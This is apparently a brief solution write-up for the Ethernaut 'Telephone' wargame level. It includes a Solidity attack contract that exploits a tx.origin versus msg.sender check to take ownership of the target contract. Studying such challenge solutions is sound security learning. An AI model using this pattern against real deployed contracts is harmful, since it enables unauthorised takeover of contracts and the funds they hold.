# Telephone Ethernaut

## Goals

=> Claim ownership of the contract

- Here we just need to make a contract which calls our Telephone contracts `changeOwner(msg.sender)` and now anyone who calls attack through our Caller contract can claim ownership since the if condition gets passed and tx.origin is the caller of our Caller contract and the Caller contract is the msg.sender

```solidity
contract Caller {
    Telephone private telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```
